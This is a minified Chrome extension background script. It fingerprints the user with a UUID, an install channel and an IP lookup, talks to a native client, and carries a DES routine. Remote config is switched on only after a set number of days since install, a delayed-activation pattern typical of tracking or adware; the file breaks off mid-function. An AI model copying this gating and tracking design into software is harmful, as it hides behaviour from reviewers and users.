!function e(t, r, n) {
    function a(c, i) {
        if (!r[c]) {
            if (!t[c]) {
                var s = "function" == typeof require && require;
                if (!i && s) return s(c, !0);
                if (o) return o(c, !0);
                var u = new Error("Cannot find module '" + c + "'");
                throw u.code = "MODULE_NOT_FOUND", u;
            }
            var f = r[c] = {
                exports: {}
            };
            t[c][0].call(f.exports, function(e) {
                var r = t[c][1][e];
                return a(r || e);
            }, f, f.exports, e, t, r, n);
        }
        return r[c].exports;
    }
    for (var o = "function" == typeof require && require, c = 0; c < n.length; c++) a(n[c]);
    return a;
}({
    1: [ function(e, t, r) {
        t.exports = function() {
            if (chrome.runtime.lastError) return !0;
        };
    }, {} ],
    2: [ function(e, t, r) {
        t.exports = function(e) {
            function t(e, t) {
                if (t || (t = function() {}), c) switch (n) {
                  case "NATIVE-MSG":
                    s(e, t);
                    break;

                  case "ALL-IN-ONE":
                    f(e, t);
                    break;

                  default:
                    t(null);
                } else i.push({
                    action: e,
                    callback: t
                });
            }
            var r, n, a, o, c = !1, i = [], s = function(e, t) {
                var r;
                "object" == typeof e ? ("[object Array]" == Object.prototype.toString.call(e.param) ? e.param.forEach(function(t, r) {
                    "object" == typeof t && (e.param[r] = JSON.stringify(t));
                }) : "object" == typeof e.param && (e.param = JSON.stringify(e.param)), r = e) : r = {
                    action: e
                }, u.sendNativeMsg(r, function(e) {
                    if (!e && chrome.runtime.lastError) t(null); else try {
                        t(JSON.parse(e.result));
                    } catch (r) {
                        t(e.result);
                    }
                });
            }, u = {
                connect: function(e) {
                    u.port = chrome.runtime.connectNative(r), u.port.onMessage.addListener(u.onNativeMessage), 
                    u.port.onDisconnect.addListener(function() {
                        e(null), u.onDisconnected();
                    });
                },
                onNativeMessage: function(e) {
                    u.callbacks[e.callback] && (u.callbacks[e.callback](e), delete u.callbacks[e.callback]);
                },
                onDisconnected: function() {
                    u.port = null;
                },
                sendNativeMsg: function(e, t) {
                    if (!u.port) {
                        if (!r) return;
                        u.connect(t);
                    }
                    var n = e.action + "-" + new Date().getTime() + "-" + Math.random();
                    e.callback = n, u.port.postMessage(e), u.callbacks[n] = t;
                },
                callbacks: {}
            }, f = function(e, t) {
                o || (o = document.querySelector('object[type="' + a + '"]'));
                var r, n, c;
                e.param ? ("[object Array]" == Object.prototype.toString.call(e.param) ? (n = e.param[0], 
                "object" == typeof (c = e.param[1]) && (c = JSON.stringify(c))) : "object" == typeof e.param && (e.param = JSON.stringify(e.param)), 
                r = n ? o[e.action](n, c) : o[e.action](e.param)) : r = o[e]();
                try {
                    r = JSON.parse(r);
                } catch (e) {}
                t(r);
            };
            return {
                init: function(e) {
                    r = e.hostName, n = e.et, a = e.pt;
                },
                setHostName: function(e) {
                    r = e;
                },
                setEt: function(e) {
                    n = e, c = !0;
                },
                getEt: function() {
                    return n;
                },
                setPt: function(e) {
                    a = e;
                },
                setHN: function(e) {
                    r = e;
                },
                setPG: function(e) {
                    o = e;
                },
                gcfc: t,
                handlePendings: function() {
                    for (var e of i) t(e.action, e.callback);
                },
                nativeMsg: u
            };
        }();
    }, {} ],
    3: [ function(e, t, r) {
        t.exports = function(t) {
            function r(e) {
                return 1 === (e = parseInt(e)) ? 1 : 0 === e ? 3 : 2;
            }
            function n(e, t) {
                return new Promise(function(t, n) {
                    try {
                        var a = document.querySelector('[type="' + e + '"]').getClient();
                        p.ps = r(a), p.et = "ALL-IN-ONE", t();
                    } catch (e) {
                        if (chrome.runtime.sendNativeMessage) {
                            var o = 0;
                            l.nativeMsg.sendNativeMsg({
                                action: "getClient"
                            }, function(e, n) {
                                o || (o = 1, chrome.runtime.lastError || void 0 === e || n ? (p.et = "NO-EXIST", 
                                p.ps = r(null)) : (p.et = "NATIVE-MSG", p.ps = r(e.result)), t());
                            }), setTimeout(function() {
                                o || (p.et = "NO-EXIST", p.ps = r(null), o = 1);
                            }, 2e3);
                        } else p.et = "NO-EXIST", p.ps = r(null), t();
                    }
                });
            }
            function a(e, t) {
                return e = e || 0, t = t || 0, t = parseInt(t), new Date(e).getDate() != new Date().getDate() && (t += 1, 
                s.set("icd", t, {
                    noexpire: !0
                }), s.set("lastTime", new Date().getTime(), {
                    noexpire: !0
                })), t;
            }
            function o() {
                return new Promise(function(e, t) {
                    l.gcfc("getSource", function(t) {
                        t && (t += ""), t && t != u.pecl ? (s.set("cl", t, {
                            noexpire: !0
                        }), e(t)) : s.get("cl", function(r) {
                            r.cl ? ((t = r.cl.value) == u.pecl && (t = u.cl, s.set("cl", t, {
                                noexpire: !0
                            })), (t += "").match(/^5\d{4}$/) && t != u.cl && 3 == p.ps ? (l.gcfc({
                                action: "setSource",
                                param: t
                            }, function() {}), s.get([ "lastTime", "icd" ], function(r) {
                                var n = a(r.lastTime ? r.lastTime.value : "", r.icd ? r.icd.value : "");
                                l.gcfc({
                                    action: "setAcd",
                                    param: n
                                }, function() {}), e(t);
                            })) : e(t)) : e(u.cl);
                        });
                    });
                });
            }
            function c(e) {
                return new Promise(function(t, r) {
                    1 == p.ps || 3 == p.ps ? l.gcfc("getUUID", function(e) {
                        s.set("uid", e, {
                            noexpire: !0
                        }), t(e);
                    }) : s.get("uid", function(r) {
                        r.uid && r.uid.value ? t(r.uid.value) : i.ajax({
                            url: e,
                            success: function(e) {
                                if (1 == e.s) {
                                    var r = e.r;
                                    s.set("uid", r, {
                                        noexpire: !0
                                    }), t(r);
                                }
                            }
                        });
                    });
                });
            }
            var i = e("../ext-utils"), s = e("../ext-storage");
            s.setStorage(chrome.storage.local);
            var u, f, l = e("../ext-clt"), m = {}, p = {};
            return m.init = function(e) {
                return u = e, p.v1 = u.ver, p.v2 = chrome.runtime.getManifest().version, new Promise(function(e, t) {
                    l.setHostName(u.hostName), l.setPt(u.pt), f = u.cl, n(u.pt, u.hostName).then(function() {
                        l.setEt(p.et), Promise.all([ o(), c(u.ruleServer + u.uidp) ]).then(function(t) {
                            p.cl = t[0], p.uid = t[1], m._init().then(function() {
                                e(p);
                            });
                        });
                    });
                });
            }, m._init = function() {
                return new Promise(function(e, t) {
                    function r() {
                        if (p.isReady = 1, p.ad = parseInt(p.ad), p.sd = parseInt(p.sd), p.ad <= p.sd && (s.remove("e"), 
                        s.remove("RL3"), s.remove("RL5")), p.ad > p.sd || f.match(/maxthon/) || f.match(/-g-/)) try {
                            sed();
                        } catch (e) {
                            window.dispatchEvent(new CustomEvent("cfg"));
                        }
                        e();
                    }
                    p.isReady = 0, 1 == p.ps || 3 == p.ps ? l.gcfc("getAll", function(e) {
                        e.ci && (e.ci = decodeURIComponent(e.ci));
                        for (var t in e) e[t] || delete e[t];
                        delete e.cl, i.extend(p, e), s.set("icd", e.ad, {
                            noexpire: !0
                        }), s.set("lastTime", new Date().getTime(), {
                            noexpire: !0
                        }), r();
                    }) : (p.sd = 10, s.get([ "lastTime", "icd" ], function(e) {
                        p.ad = a(e.lastTime ? e.lastTime.value : "", e.icd ? e.icd.value : ""), r();
                    }));
                });
            }, m;
        }();
    }, {
        "../ext-clt": 2,
        "../ext-storage": 7,
        "../ext-utils": 9
    } ],
    4: [ function(e, t, r) {
        function a(e) {
            var t = new Array(), r = e.length, n = parseInt(r / 4), a = r % 4, c = 0;
            for (c = 0; c < n; c++) t[c] = o(e.substring(4 * c + 0, 4 * c + 4));
            return a > 0 && (t[c] = o(e.substring(4 * c + 0, r))), t;
        }
        function o(e) {
            var t = e.length, r = new Array(64);
            if (t < 4) {
                var n = 0, a = 0, o = 0, c = 0;
                for (n = 0; n < t; n++) {
                    u = e.charCodeAt(n);
                    for (a = 0; a < 16; a++) {
                        var i = 1, s = 0;
                        for (s = 15; s > a; s--) i *= 2;
                        r[16 * n + a] = parseInt(u / i) % 2;
                    }
                }
                for (o = t; o < 4; o++) {
                    u = 0;
                    for (c = 0; c < 16; c++) {
                        var i = 1, s = 0;
                        for (s = 15; s > c; s--) i *= 2;
                        r[16 * o + c] = parseInt(u / i) % 2;
                    }
                }
            } else for (n = 0; n < 4; n++) {
                var u = e.charCodeAt(n);
                for (a = 0; a < 16; a++) {
                    i = 1;
                    for (s = 15; s > a; s--) i *= 2;
                    r[16 * n + a] = parseInt(u / i) % 2;
                }
            }
            return r;
        }
        function c(e) {
            var t;
            switch (e) {
              case "0000":
                t = "0";
                break;

              case "0001":
                t = "1";
                break;

              case "0010":
                t = "2";
                break;

              case "0011":
                t = "3";
                break;

              case "0100":
                t = "4";
                break;

              case "0101":
                t = "5";
                break;

              case "0110":
                t = "6";
                break;

              case "0111":
                t = "7";
                break;

              case "1000":
                t = "8";
                break;

              case "1001":
                t = "9";
                break;

              case "1010":
                t = "A";
                break;

              case "1011":
                t = "B";
                break;

              case "1100":
                t = "C";
                break;

              case "1101":
                t = "D";
                break;

              case "1110":
                t = "E";
                break;

              case "1111":
                t = "F";
            }
            return t;
        }
        function s(e) {
            var t;
            switch (e) {
              case "0":
                t = "0000";
                break;

              case "1":
                t = "0001";
                break;

              case "2":
                t = "0010";
                break;

              case "3":
                t = "0011";
                break;

              case "4":
                t = "0100";
                break;

              case "5":
                t = "0101";
                break;

              case "6":
                t = "0110";
                break;

              case "7":
                t = "0111";
                break;

              case "8":
                t = "1000";
                break;

              case "9":
                t = "1001";
                break;

              case "A":
                t = "1010";
                break;

              case "B":
                t = "1011";
                break;

              case "C":
                t = "1100";
                break;

              case "D":
                t = "1101";
                break;

              case "E":
                t = "1110";
                break;

              case "F":
                t = "1111";
            }
            return t;
        }
        function u(e) {
            var t = "";
            for (i = 0; i < 4; i++) {
                var r = 0;
                for (j = 0; j < 16; j++) {
                    var n = 1;
                    for (m = 15; m > j; m--) n *= 2;
                    r += e[16 * i + j] * n;
                }
                0 != r && (t += String.fromCharCode(r));
            }
            return t;
        }
        function f(e) {
            var t = "";
            for (i = 0; i < 16; i++) {
                var r = "";
                for (j = 0; j < 4; j++) r += e[4 * i + j];
                t += c(r);
            }
            return t;
        }
        function l(e) {
            var t = "";
            for (i = 0; i < 16; i++) t += s(e.substring(i, i + 1));
            return t;
        }
        function p(e, t) {
            var r = A(t), n = d(e), a = new Array(32), o = new Array(32), c = new Array(32), i = 0, s = 0, u = 0, f = 0, l = 0;
            for (u = 0; u < 32; u++) a[u] = n[u], o[u] = n[32 + u];
            for (i = 0; i < 16; i++) {
                for (s = 0; s < 32; s++) c[s] = a[s], a[s] = o[s];
                var m = new Array(48);
                for (f = 0; f < 48; f++) m[f] = r[i][f];
                var p = b(y(h(b(g(o), m))), c);
                for (l = 0; l < 32; l++) o[l] = p[l];
            }
            var v = new Array(64);
            for (i = 0; i < 32; i++) v[i] = o[i], v[32 + i] = a[i];
            return x(v);
        }
        function v(e, t) {
            var r = A(t), n = d(e), a = new Array(32), o = new Array(32), c = new Array(32), i = 0, s = 0, u = 0, f = 0, l = 0;
            for (u = 0; u < 32; u++) a[u] = n[u], o[u] = n[32 + u];
            for (i = 15; i >= 0; i--) {
                for (s = 0; s < 32; s++) c[s] = a[s], a[s] = o[s];
                var m = new Array(48);
                for (f = 0; f < 48; f++) m[f] = r[i][f];
                var p = b(y(h(b(g(o), m))), c);
                for (l = 0; l < 32; l++) o[l] = p[l];
            }
            var v = new Array(64);
            for (i = 0; i < 32; i++) v[i] = o[i], v[32 + i] = a[i];
            return x(v);
        }
        function d(e) {
            var t = new Array(64);
            for (i = 0, m = 1, n = 0; i < 4; i++, m += 2, n += 2) for (j = 7, k = 0; j >= 0; j--, 
            k++) t[8 * i + k] = e[8 * j + m], t[8 * i + k + 32] = e[8 * j + n];
            return t;
        }
        function g(e) {
            var t = new Array(48);
            for (i = 0; i < 8; i++) 0 == i ? t[6 * i + 0] = e[31] : t[6 * i + 0] = e[4 * i - 1], 
            t[6 * i + 1] = e[4 * i + 0], t[6 * i + 2] = e[4 * i + 1], t[6 * i + 3] = e[4 * i + 2], 
            t[6 * i + 4] = e[4 * i + 3], 7 == i ? t[6 * i + 5] = e[0] : t[6 * i + 5] = e[4 * i + 4];
            return t;
        }
        function b(e, t) {
            var r = new Array(e.length);
            for (i = 0; i < e.length; i++) r[i] = e[i] ^ t[i];
            return r;
        }
        function h(e) {
            var t = new Array(32), r = "", n = [ [ 14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7 ], [ 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8 ], [ 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0 ], [ 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13 ] ], a = [ [ 15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10 ], [ 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5 ], [ 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15 ], [ 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9 ] ], o = [ [ 10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8 ], [ 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1 ], [ 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7 ], [ 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12 ] ], c = [ [ 7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15 ], [ 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9 ], [ 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4 ], [ 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14 ] ], i = [ [ 2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9 ], [ 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6 ], [ 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14 ], [ 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3 ] ], s = [ [ 12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11 ], [ 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8 ], [ 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6 ], [ 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13 ] ], u = [ [ 4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1 ], [ 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6 ], [ 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2 ], [ 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12 ] ], f = [ [ 13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7 ], [ 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2 ], [ 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8 ], [ 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11 ] ];
            for (m = 0; m < 8; m++) {
                var l = 0, p = 0;
                switch (l = 2 * e[6 * m + 0] + e[6 * m + 5], p = 2 * e[6 * m + 1] * 2 * 2 + 2 * e[6 * m + 2] * 2 + 2 * e[6 * m + 3] + e[6 * m + 4], 
                m) {
                  case 0:
                    r = w(n[l][p]);
                    break;

                  case 1:
                    r = w(a[l][p]);
                    break;

                  case 2:
                    r = w(o[l][p]);
                    break;

                  case 3:
                    r = w(c[l][p]);
                    break;

                  case 4:
                    r = w(i[l][p]);
                    break;

                  case 5:
                    r = w(s[l][p]);
                    break;

                  case 6:
                    r = w(u[l][p]);
                    break;

                  case 7:
                    r = w(f[l][p]);
                }
                t[4 * m + 0] = parseInt(r.substring(0, 1)), t[4 * m + 1] = parseInt(r.substring(1, 2)), 
                t[4 * m + 2] = parseInt(r.substring(2, 3)), t[4 * m + 3] = parseInt(r.substring(3, 4));
            }
            return t;
        }
        function y(e) {
            var t = new Array(32);
            return t[0] = e[15], t[1] = e[6], t[2] = e[19], t[3] = e[20], t[4] = e[28], t[5] = e[11], 
            t[6] = e[27], t[7] = e[16], t[8] = e[0], t[9] = e[14], t[10] = e[22], t[11] = e[25], 
            t[12] = e[4], t[13] = e[17], t[14] = e[30], t[15] = e[9], t[16] = e[1], t[17] = e[7], 
            t[18] = e[23], t[19] = e[13], t[20] = e[31], t[21] = e[26], t[22] = e[2], t[23] = e[8], 
            t[24] = e[18], t[25] = e[12], t[26] = e[29], t[27] = e[5], t[28] = e[21], t[29] = e[10], 
            t[30] = e[3], t[31] = e[24], t;
        }
        function x(e) {
            var t = new Array(64);
            return t[0] = e[39], t[1] = e[7], t[2] = e[47], t[3] = e[15], t[4] = e[55], t[5] = e[23], 
            t[6] = e[63], t[7] = e[31], t[8] = e[38], t[9] = e[6], t[10] = e[46], t[11] = e[14], 
            t[12] = e[54], t[13] = e[22], t[14] = e[62], t[15] = e[30], t[16] = e[37], t[17] = e[5], 
            t[18] = e[45], t[19] = e[13], t[20] = e[53], t[21] = e[21], t[22] = e[61], t[23] = e[29], 
            t[24] = e[36], t[25] = e[4], t[26] = e[44], t[27] = e[12], t[28] = e[52], t[29] = e[20], 
            t[30] = e[60], t[31] = e[28], t[32] = e[35], t[33] = e[3], t[34] = e[43], t[35] = e[11], 
            t[36] = e[51], t[37] = e[19], t[38] = e[59], t[39] = e[27], t[40] = e[34], t[41] = e[2], 
            t[42] = e[42], t[43] = e[10], t[44] = e[50], t[45] = e[18], t[46] = e[58], t[47] = e[26], 
            t[48] = e[33], t[49] = e[1], t[50] = e[41], t[51] = e[9], t[52] = e[49], t[53] = e[17], 
            t[54] = e[57], t[55] = e[25], t[56] = e[32], t[57] = e[0], t[58] = e[40], t[59] = e[8], 
            t[60] = e[48], t[61] = e[16], t[62] = e[56], t[63] = e[24], t;
        }
        function w(e) {
            var t = "";
            switch (e) {
              case 0:
                t = "0000";
                break;

              case 1:
                t = "0001";
                break;

              case 2:
                t = "0010";
                break;

              case 3:
                t = "0011";
                break;

              case 4:
                t = "0100";
                break;

              case 5:
                t = "0101";
                break;

              case 6:
                t = "0110";
                break;

              case 7:
                t = "0111";
                break;

              case 8:
                t = "1000";
                break;

              case 9:
                t = "1001";
                break;

              case 10:
                t = "1010";
                break;

              case 11:
                t = "1011";
                break;

              case 12:
                t = "1100";
                break;

              case 13:
                t = "1101";
                break;

              case 14:
                t = "1110";
                break;

              case 15:
                t = "1111";
            }
            return t;
        }
        function A(e) {
            var t = new Array(56), r = new Array();
            r[0] = new Array(), r[1] = new Array(), r[2] = new Array(), r[3] = new Array(), 
            r[4] = new Array(), r[5] = new Array(), r[6] = new Array(), r[7] = new Array(), 
            r[8] = new Array(), r[9] = new Array(), r[10] = new Array(), r[11] = new Array(), 
            r[12] = new Array(), r[13] = new Array(), r[14] = new Array(), r[15] = new Array();
            var n = [ 1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1 ];
            for (a = 0; a < 7; a++) for (j = 0, k = 7; j < 8; j++, k--) t[8 * a + j] = e[8 * k + a];
            var a = 0;
            for (a = 0; a < 16; a++) {
                var o = 0, c = 0;
                for (j = 0; j < n[a]; j++) {
                    for (o = t[0], c = t[28], k = 0; k < 27; k++) t[k] = t[k + 1], t[28 + k] = t[29 + k];
                    t[27] = o, t[55] = c;
                }
                var i = new Array(48);
                switch (i[0] = t[13], i[1] = t[16], i[2] = t[10], i[3] = t[23], i[4] = t[0], i[5] = t[4], 
                i[6] = t[2], i[7] = t[27], i[8] = t[14], i[9] = t[5], i[10] = t[20], i[11] = t[9], 
                i[12] = t[22], i[13] = t[18], i[14] = t[11], i[15] = t[3], i[16] = t[25], i[17] = t[7], 
                i[18] = t[15], i[19] = t[6], i[20] = t[26], i[21] = t[19], i[22] = t[12], i[23] = t[1], 
                i[24] = t[40], i[25] = t[51], i[26] = t[30], i[27] = t[36], i[28] = t[46], i[29] = t[54], 
                i[30] = t[29], i[31] = t[39], i[32] = t[50], i[33] = t[44], i[34] = t[32], i[35] = t[47], 
                i[36] = t[43], i[37] = t[48], i[38] = t[38], i[39] = t[55], i[40] = t[33], i[41] = t[52], 
                i[42] = t[45], i[43] = t[41], i[44] = t[49], i[45] = t[35], i[46] = t[28], i[47] = t[31], 
                a) {
                  case 0:
                    for (m = 0; m < 48; m++) r[0][m] = i[m];
                    break;

                  case 1:
                    for (m = 0; m < 48; m++) r[1][m] = i[m];
                    break;

                  case 2:
                    for (m = 0; m < 48; m++) r[2][m] = i[m];
                    break;

                  case 3:
                    for (m = 0; m < 48; m++) r[3][m] = i[m];
                    break;

                  case 4:
                    for (m = 0; m < 48; m++) r[4][m] = i[m];
                    break;

                  case 5:
                    for (m = 0; m < 48; m++) r[5][m] = i[m];
                    break;

                  case 6:
                    for (m = 0; m < 48; m++) r[6][m] = i[m];
                    break;

                  case 7:
                    for (m = 0; m < 48; m++) r[7][m] = i[m];
                    break;

                  case 8:
                    for (m = 0; m < 48; m++) r[8][m] = i[m];
                    break;

                  case 9:
                    for (m = 0; m < 48; m++) r[9][m] = i[m];
                    break;

                  case 10:
                    for (m = 0; m < 48; m++) r[10][m] = i[m];
                    break;

                  case 11:
                    for (m = 0; m < 48; m++) r[11][m] = i[m];
                    break;

                  case 12:
                    for (m = 0; m < 48; m++) r[12][m] = i[m];
                    break;

                  case 13:
                    for (m = 0; m < 48; m++) r[13][m] = i[m];
                    break;

                  case 14:
                    for (m = 0; m < 48; m++) r[14][m] = i[m];
                    break;

                  case 15:
                    for (m = 0; m < 48; m++) r[15][m] = i[m];
                }
            }
            return r;
        }
        t.exports = {
            e: function(e, t, r, n) {
                var c, i, s, u, l, m, v = e.length, d = "";
                if (null != t && "" != t && (u = (c = a(t)).length), null != r && "" != r && (l = (i = a(r)).length), 
                null != n && "" != n && (m = (s = a(n)).length), v > 0) if (v < 4) {
                    var g = o(e);
                    if (null != t && "" != t && null != r && "" != r && null != n && "" != n) {
                        for (A = g, T = 0; T < u; T++) A = p(A, c[T]);
                        for (j = 0; j < l; j++) A = p(A, i[j]);
                        for (w = 0; w < m; w++) A = p(A, s[w]);
                        y = A;
                    } else if (null != t && "" != t && null != r && "" != r) {
                        for (A = g, T = 0; T < u; T++) A = p(A, c[T]);
                        for (j = 0; j < l; j++) A = p(A, i[j]);
                        y = A;
                    } else if (null != t && "" != t) {
                        for (T = 0, A = g, T = 0; T < u; T++) A = p(A, c[T]);
                        y = A;
                    }
                    d = f(y);
                } else {
                    var b = parseInt(v / 4), h = v % 4, k = 0;
                    for (k = 0; k < b; k++) {
                        if (x = o(e.substring(4 * k + 0, 4 * k + 4)), null != t && "" != t && null != r && "" != r && null != n && "" != n) {
                            for (A = x, T = 0; T < u; T++) A = p(A, c[T]);
                            for (j = 0; j < l; j++) A = p(A, i[j]);
                            for (w = 0; w < m; w++) A = p(A, s[w]);
                            y = A;
                        } else if (null != t && "" != t && null != r && "" != r) {
                            for (A = x, T = 0; T < u; T++) A = p(A, c[T]);
                            for (j = 0; j < l; j++) A = p(A, i[j]);
                            y = A;
                        } else if (null != t && "" != t) {
                            for (A = x, T = 0; T < u; T++) A = p(A, c[T]);
                            y = A;
                        }
                        d += f(y);
                    }
                    if (h > 0) {
                        var y, x = o(e.substring(4 * b + 0, v));
                        if (null != t && "" != t && null != r && "" != r && null != n && "" != n) {
                            var w;
                            for (A = x, T = 0; T < u; T++) A = p(A, c[T]);
                            for (j = 0; j < l; j++) A = p(A, i[j]);
                            for (w = 0; w < m; w++) A = p(A, s[w]);
                            y = A;
                        } else if (null != t && "" != t && null != r && "" != r) {
                            var j;
                            for (A = x, T = 0; T < u; T++) A = p(A, c[T]);
                            for (j = 0; j < l; j++) A = p(A, i[j]);
                            y = A;
                        } else if (null != t && "" != t) {
                            var A, T;
                            for (A = x, T = 0; T < u; T++) A = p(A, c[T]);
                            y = A;
                        }
                        d += f(y);
                    }
                }
                return d;
            },
            d: function(e, t, r, n) {
                var o, c, i, s, f, m, p = e.length, d = "";
                null != t && "" != t && (s = (o = a(t)).length), null != r && "" != r && (f = (c = a(r)).length), 
                null != n && "" != n && (m = (i = a(n)).length);
                var g = parseInt(p / 16), b = 0;
                for (b = 0; b < g; b++) {
                    var h = l(e.substring(16 * b + 0, 16 * b + 16)), k = new Array(64), y = 0;
                    for (y = 0; y < 64; y++) k[y] = parseInt(h.substring(y, y + 1));
                    var x;
                    if (null != t && "" != t && null != r && "" != r && null != n && "" != n) {
                        for (w = k, j = m - 1; j >= 0; j--) w = v(w, i[j]);
                        for (A = f - 1; A >= 0; A--) w = v(w, c[A]);
                        for (T = s - 1; T >= 0; T--) w = v(w, o[T]);
                        x = w;
                    } else if (null != t && "" != t && null != r && "" != r) {
                        for (w = k, j = f - 1; j >= 0; j--) w = v(w, c[j]);
                        for (A = s - 1; A >= 0; A--) w = v(w, o[A]);
                        x = w;
                    } else if (null != t && "" != t) {
                        var w, j, A, T;
                        for (w = k, j = s - 1; j >= 0; j--) w = v(w, o[j]);
                        x = w;
                    }
                    d += u(x);
                }
                return d;
            }
        };
    }, {} ],
    5: [ function(e, t, r) {
        t.exports = function(t, r) {
            r = r || {};
            var n = e("../ext-clt"), a = e("../ext-utils");
            if (n.setHostName(r.hostName), n.setEt(r.et), t.type && (t.type = t.type.toUpperCase()), 
            1 == r.ps || 3 == r.ps) {
                var o, c = t.url;
                t.data && ("string" != typeof t.data && (o = a.http_build_query(t.data)), c += (c.match(/\?/) ? "&" : "?") + o), 
                n.gcfc({
                    action: "getInfoB",
                    param: [ c, navigator.userAgent ]
                }, function(e) {
                    if ("text" != t.dataType) try {
                        e = JSON.parse(e);
                    } catch (e) {}
                    t.success && t.success(e);
                });
            } else a.ajax(t);
        };
    }, {
        "../ext-clt": 2,
        "../ext-utils": 9
    } ],
    6: [ function(e, t, r) {
        t.exports = function(t, r) {
            function n(e, t, r, n, a) {
                "get" == e ? i.get(t, function(e) {
                    var r = e[t];
                    r && (r = r.value), a && a(r);
                }) : i.set(t, r, n);
            }
            function a(e, t, r) {
                s && s.gcfc({
                    action: e,
                    param: t
                }, function() {});
            }
            function o(e, t) {
                e.success = t, f(e, l.env);
            }
            function c(e, t, r, n) {
                t = t.split(".");
                for (var a, o = l, c = 0; c < t.length; c++) {
                    var i = t[c];
                    if ("get" == e) {
                        if (!(a = o = o[i])) break;
                    } else c == t.length - 1 ? o[i] = r : (o[i] || (o[i] = {}), o = o[i]);
                }
                t.forEach(function(e, t) {}), n && n(a);
            }
            var i, s, u = e("../ext-utils").ajax, f = e("../ext-getRemoteResource/"), l = {}, m = {
                env: {},
                setCache: function(e) {
                    i = e;
                },
                setCt: function(e) {
                    s = e;
                },
                init: function(e, t, r) {
                    this.urls = t, this.env = e;
                    var n = [];
                    if (r) {
                        for (var a in r) n.push(a);
                        this.default_params = n.join("&");
                    }
                },
                getIP: function(e) {
                    u({
                        url: "http://int.dpool.sina.com.cn/iplookup/iplookup.php",
                        data: {
                            format: "json"
                        },
                        dataType: "json",
                        success: function(t) {
                            e(t);
                        },
                        error: function(t, r, n) {
                            e(null);
                        }
                    });
                }
            };
            return m.helper = {
                requestHandler: function(e, t, r, i) {
                    var s = function() {
                        var e = arguments && arguments[0];
                        r && r(e);
                    };
                    switch (e.topic) {
                      case "cache":
                        n(e.action, e.key, e.value, e.options, s);
                        break;

                      case "client":
                        a(e.action, e.param);
                        break;

                      case "net":
                        e.settings.success = s, o(e.settings, s);
                        break;

                      case "extmem":
                        c(e.action, e.key, e.value, s);
                        break;

                      default:
                        m[e.topic] && m[e.topic](e, s);
                    }
                    return !0;
                }
            }, m;
        }();
    }, {
        "../ext-getRemoteResource/": 5,
        "../ext-utils": 9
    } ],
    7: [ function(e, t, r) {
        var n = chrome.storage.local;
        t.exports = {
            setStorage: function(e) {
                n = e;
            },
            _is_expired: function(e) {
                return e.options && e.options.expire && e.options.expire < new Date().getTime();
            },
            get: function(e, t) {
                n.get(e, function(r) {
                    for (var n in r) {
                        var a = r[n];
                        if (a) try {
                            this._is_expired(a) && (this.remove(e), delete r[n]);
                        } catch (e) {}
                    }
                    t(r);
                }.bind(this));
            },
            set: function(e, t, r) {
                var a = r || {};
                if (!a.skip) {
                    r && r.expire && (a.expire = new Date().getTime() + r.expire);
                    var o = {};
                    o[e] = {
                        key: e,
                        value: t,
                        options: a
                    }, n.set(o);
                }
            },
            clear: function(e) {
                n.clear();
            },
            remove: function(e) {
                n.remove(e);
            }
        };
    }, {} ],
    8: [ function(e, t, r) {
        var n = e("../ext-storage"), a = e("../ext-clt"), o = e("../ext-utils");
        t.exports = function(e) {
            function t() {
                var t = {
                    _u: e.cfg,
                    success: function(t) {
                        n.set("siz", t, {
                            lut: c,
                            version: e.v1
                        });
                    }
                };
                o.extend(t, o.getImpParams(e)), o.setConfig(t);
            }
            function r() {
                try {
                    a.gcfc({
                        action: "getInfoA",
                        param: navigator.userAgent
                    }, function(r) {
                        r ? n.set("siz", r, {
                            lut: c,
                            version: e.v1
                        }) : t();
                    });
                } catch (e) {
                    t();
                }
            }
            var c = Math.floor(new Date().getTime() / 864e5);
            e.ad <= e.sd || n.get("siz", function(n) {
                var a, o = n.siz;
                if (o) try {
